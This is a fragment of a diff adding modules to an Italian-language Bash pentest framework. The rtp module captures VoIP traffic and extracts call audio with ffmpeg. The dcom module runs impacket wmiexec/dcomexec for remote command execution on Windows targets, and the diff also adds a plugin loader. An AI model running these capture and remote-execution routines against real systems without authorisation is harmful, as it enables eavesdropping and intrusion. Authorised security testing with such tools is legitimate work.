+        case "$1" in
+            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
+            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
+            --pcap)     _req_arg "$1" "${2:-}"; pcap="$2";     shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)  DRY_RUN=1; shift ;;
+            --help|-h)  echo "Uso: exa-dune rtp [TARGET] [--iface IFACE] [--duration SEC] [--pcap FILE]"; exit 0 ;;
+            -*)         err "Opzione sconosciuta: $1"; exit 1 ;;
+            *)          target="$1"; shift ;;
+        esac
+    done
+    check_root
+
+    local ts; ts=$(date +%Y%m%d_%H%M%S)
+    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-rtp_${ts}}"
+    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
+    _log_file="$OUTDIR_BASE/rtp.log"
+
+    section "RTP Stream Analysis"
+
+    # Rileva interfaccia se non specificata
+    if [[ -z "$iface" ]]; then
+        iface=$(ip route show 2>/dev/null | grep -oP 'dev \K\S+' | head -1 || echo "eth0")
+    fi
+
+    local pcap_file="${pcap:-$OUTDIR_BASE/rtp_capture.pcap}"
+
+    if [[ -z "$pcap" ]]; then
+        # Cattura passiva RTP (porte RTP standard 16384-32767)
+        section "Cattura passiva RTP (${duration}s)"
+        local _filter="udp portrange 16384-32767"
+        [[ -n "$target" ]] && _filter="$_filter and host $target"
+        if [[ $DRY_RUN -eq 1 ]]; then
+            echo -e "${CYAN}[DRY-RUN]${NC} tcpdump -i $iface -w $pcap_file '$_filter' &"
+            echo -e "${CYAN}[DRY-RUN]${NC} sleep $duration; kill tcpdump"
+        else
+            log "Cattura RTP su $iface per ${duration}s → $pcap_file"
+            timeout "$duration" tcpdump -i "$iface" -w "$pcap_file" "$_filter" \
+                2>&1 | tee "$OUTDIR_BASE/tcpdump_rtp.log" || true
+            ok "PCAP RTP salvato: $pcap_file"
+        fi
+    fi
+
+    # Analisi PCAP con rtpdump se disponibile
+    if [[ $DRY_RUN -eq 0 && -f "$pcap_file" ]]; then
+        section "Analisi stream RTP"
+        if command -v rtpdump &>/dev/null; then
+            rtpdump -F ascii "$pcap_file" 2>/dev/null | \
+                tee "$OUTDIR_BASE/rtp_streams.txt" || true
+            local _stream_count
+            _stream_count=$(grep -c "^source=" "$OUTDIR_BASE/rtp_streams.txt" 2>/dev/null || echo 0)
+            [[ "$_stream_count" -gt 0 ]] && found MEDIUM "RTP: $_stream_count stream rilevati nel PCAP"
+        fi
+
+        # Estrai payload audio con ffmpeg se disponibile
+        if command -v ffmpeg &>/dev/null; then
+            log "Estrazione audio da PCAP con ffmpeg..."
+            ffmpeg -i "$pcap_file" -ar 8000 \
+                "$OUTDIR_BASE/rtp_audio.wav" 2>/dev/null || true
+            [[ -f "$OUTDIR_BASE/rtp_audio.wav" ]] && \
+                found HIGH "RTP audio estratto: $OUTDIR_BASE/rtp_audio.wav"
+        fi
+
+        # Statistiche base con tshark se disponibile
+        if command -v tshark &>/dev/null; then
+            tshark -r "$pcap_file" -q -z rtp,streams 2>/dev/null | \
+                tee "$OUTDIR_BASE/rtp_stats.txt" || true
+            ok "Statistiche RTP: $OUTDIR_BASE/rtp_stats.txt"
+        fi
+    else
+        [[ $DRY_RUN -eq 1 ]] && {
+            echo -e "${CYAN}[DRY-RUN]${NC} rtpdump -F ascii $pcap_file"
+            echo -e "${CYAN}[DRY-RUN]${NC} ffmpeg -i $pcap_file -ar 8000 $OUTDIR_BASE/rtp_audio.wav"
+            echo -e "${CYAN}[DRY-RUN]${NC} tshark -r $pcap_file -q -z rtp,streams"
+        }
+    fi
+
+    ok "RTP analysis completato → $OUTDIR_BASE"
+}
+
+# ============================================================
+#  SUBCOMMAND: dcom
+# ============================================================
+cmd_dcom() {
+    local target="" username="" password="" domain="" command_exec=""
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --user|-u)    _req_arg "$1" "${2:-}"; username="$2"; shift 2 ;;
+            --pass|-p)    _req_arg "$1" "${2:-}"; password="$2"; shift 2 ;;
+            --domain|-d)  _req_arg "$1" "${2:-}"; domain="$2";   shift 2 ;;
+            --exec)       _req_arg "$1" "${2:-}"; command_exec="$2"; shift 2 ;;
+            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run)    DRY_RUN=1; shift ;;
+            --help|-h)    echo "Uso: exa-dune dcom <TARGET> [-u USER] [-p PASS] [-d DOMAIN] [--exec CMD]"; exit 0 ;;
+            -*)           err "Opzione sconosciuta: $1"; exit 1 ;;
+            *)            target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; exit 1; }
+    validate_target "$target"
+    setup_outdir "$target" "dcom"
+
+    section "DCOM/WMI Audit — $target"
+    log "Target: $target | Output: $OUTDIR"
+
+    # Verifica prerequisiti (porte 135/445)
+    section "Verifica porte DCOM/WMI (135, 445)"
+    if [[ $DRY_RUN -eq 1 ]]; then
+        echo -e "${CYAN}[DRY-RUN]${NC} nmap -sV -p 135,445,593 $target"
+    else
+        nmap -sV -p 135,445,593 $NMAP_TIMING \
+            -oN "$OUTDIR/nmap_dcom.txt" "$target" 2>/dev/null | \
+            tee "$OUTDIR/nmap_dcom_screen.txt" || true
+        if grep -qE "135/tcp.*open|445/tcp.*open" "$OUTDIR/nmap_dcom.txt" 2>/dev/null; then
+            found MEDIUM "DCOM/RPC port 135 aperta su $target"
+        fi
+        # Verifica OS Windows
+        if grep -qi "windows\|microsoft" "$OUTDIR/nmap_dcom.txt" 2>/dev/null; then
+            found MEDIUM "OS Windows rilevato su $target — DCOM attack surface"
+        fi
+    fi
+
+    # WMI enumeration con impacket
+    if command -v impacket-wmiexec &>/dev/null || command -v wmiexec.py &>/dev/null; then
+        local _wmi_cmd; _wmi_cmd=$(command -v impacket-wmiexec 2>/dev/null || command -v wmiexec.py 2>/dev/null)
+        local _auth=""
+        [[ -n "$domain" ]]   && _auth="${domain}/"
+        [[ -n "$username" ]] && _auth="${_auth}${username}"
+        [[ -n "$password" ]] && _auth="${_auth}:${password}"
+        [[ -z "$_auth" ]]    && _auth="anonymous"
+
+        section "WMI Enumeration (impacket)"
+        local _cmd_str="${command_exec:-whoami}"
+        if [[ $DRY_RUN -eq 1 ]]; then
+            echo -e "${CYAN}[DRY-RUN]${NC} $_wmi_cmd ${_auth}@${target} '$_cmd_str'"
+        else
+            timeout 30 "$_wmi_cmd" "${_auth}@${target}" \
+                -nointeractive -shell-type cmd \
+                "$_cmd_str" 2>&1 | \
+                tee "$OUTDIR/wmiexec_output.txt" || true
+            if grep -qi "windows\|system32\|NT AUTHORITY" "$OUTDIR/wmiexec_output.txt" 2>/dev/null; then
+                found CRITICAL "WMI Remote Execution riuscita su $target come ${_auth}"
+            fi
+        fi
+    else
+        warn "impacket-wmiexec non disponibile: apt install python3-impacket"
+    fi
+
+    # DCOM exec con impacket-dcomexec
+    if command -v impacket-dcomexec &>/dev/null && [[ -n "$username" && -n "$password" ]]; then
+        section "DCOM Exec (impacket-dcomexec)"
+        local _dauth="${domain:+${domain}/}${username}:${password}"
+        if [[ $DRY_RUN -eq 1 ]]; then
+            echo -e "${CYAN}[DRY-RUN]${NC} impacket-dcomexec ${_dauth}@${target} '${command_exec:-whoami}'"
+        else
+            timeout 30 impacket-dcomexec \
+                "${_dauth}@${target}" \
+                -object MMC20 \
+                "${command_exec:-whoami}" 2>&1 | \
+                tee "$OUTDIR/dcomexec_output.txt" || true
+            if grep -qi "microsoft\|windows\|NT AUTHORITY" "$OUTDIR/dcomexec_output.txt" 2>/dev/null; then
+                found CRITICAL "DCOM Exec riuscita su $target"
+            fi
+        fi
+    fi
+
+    ok "DCOM audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: plugins
+# ============================================================
+_load_plugins() {
+    local plugin_dir="${HOME}/.exa-dune/plugins"
+    [[ ! -d "$plugin_dir" ]] && return 0
+    for plugin in "$plugin_dir"/*.sh; do
+        [[ -f "$plugin" ]] && source "$plugin" && \
+            log "Plugin caricato: $(basename "$plugin")" || \
+            warn "Plugin fallito: $(basename "$plugin")"
+    done
+}
+
+cmd_plugins() {
+    local plugin_dir="${HOME}/.exa-dune/plugins"
+    case "${1:-list}" in
+        list)
+            echo "Plugin directory: $plugin_dir"
+            if [[ -d "$plugin_dir" ]]; then
+                local _found=0
+                for p in "$plugin_dir"/*.sh; do
+                    [[ -f "$p" ]] && { echo "  $(basename "$p")"; _found=1; }
+                done
+                [[ $_found -eq 0 ]] && echo "  (nessun plugin installato)"
+            else
+                echo "  (nessun plugin installato)"
+            fi
+            ;;
+        create)
+            local name="${2:-myplugin}"
+            mkdir -p "$plugin_dir"
+            cat > "$plugin_dir/${name}.sh" <<'PLUGEOF'
+# exa-dune plugin template
+# Name: __PLUGIN_NAME__
+# Description: Custom module
+# Usage: exa-dune __PLUGIN_NAME__ <target>
+
+usage___PLUGIN_NAME__() {
+    echo "Uso: exa-dune __PLUGIN_NAME__ <TARGET> [OPTIONS]"
+}
+
+cmd___PLUGIN_NAME__() {
+    local target="${1:-}"
+    [[ -z "$target" ]] && { err "TARGET mancante"; exit 1; }
+    setup_outdir "$target" "__PLUGIN_NAME__"
+    section "__PLUGIN_NAME__ scan"
+    log "Target: $target"
+    # Aggiungi qui la logica del plugin
+    found LOW "__PLUGIN_NAME__ — completato su $target"
+    ok "Output: $OUTDIR"
+}
+
+# Register in dispatcher (automatic via plugin system)
+EXA_PLUGIN_CMDS["__PLUGIN_NAME__"]="cmd___PLUGIN_NAME__"
+PLUGEOF
+            sed -i "s/__PLUGIN_NAME__/$name/g" "$plugin_dir/${name}.sh"
+            ok "Plugin template creato: $plugin_dir/${name}.sh"
+            ;;
+        dir)
+            mkdir -p "$plugin_dir"
+            echo "$plugin_dir"
+            ;;
+        *)
+            err "Uso: exa-dune plugins [list|create <nome>|dir]"
+            exit 1
+            ;;
+    esac
+}
+
+# ── Progress tracking ────────────────────────────────────────
+_TOTAL_MODS=0
+_DONE_MODS=0
+_progress_bar() {
+    local done=$1 total=$2 label="${3:-}"
+    [[ $total -eq 0 ]] && return
+    local pct=$(( done * 100 / total ))
+    local filled=$(( done * 20 / total ))
+    local bar=""
+    for ((i=0; i<filled; i++)); do bar+="█"; done
+    for ((i=filled; i<20; i++)); do bar+="░"; done
+    printf "\r  [%s] %3d%% (%d/%d) %s" "$bar" "$pct" "$done" "$total" "$label"
+    [[ $done -eq $total ]] && echo ""
+}
+
+# ============================================================
 #  MAIN DISPATCHER
 # ============================================================
 [[ $# -eq 0 ]] && { cmd_help; exit 0; }
+
+# Carica configurazione utente e plugin
+_load_config
+declare -A EXA_PLUGIN_CMDS 2>/dev/null || true
+_load_plugins
 
 # Pre-processing flag globali prima del subcommand
 _pre_args=()
@@ -17724,7 +18472,20 @@ case "$subcommand" in
     ble)            cmd_ble            "$@" ;;
     jwt)            cmd_jwt            "$@" ;;
     msf)            cmd_msf            "$@" ;;
+    config)         cmd_config         "$@" ;;
+    completion)     cmd_completion     "$@" ;;
+    dhcp)           cmd_dhcp           "$@" ;;
+    rtp)            cmd_rtp            "$@" ;;
+    dcom)           cmd_dcom           "$@" ;;
+    plugins)        cmd_plugins        "$@" ;;
     help|-h|--help) cmd_help "$@" ;;
     version|--version) echo "exa-dune $VERSION"; exit 0 ;;
-    *) err "Subcommand sconosciuto: $subcommand"; cmd_help; exit 1 ;;
+    *)
+        # Controlla plugin dinamici
+        if [[ -n "${EXA_PLUGIN_CMDS[$subcommand]+x}" ]]; then
+            "${EXA_PLUGIN_CMDS[$subcommand]}" "$@"
+        else
+            err "Subcommand sconosciuto: $subcommand"; cmd_help; exit 1
+        fi
+        ;;
 esac
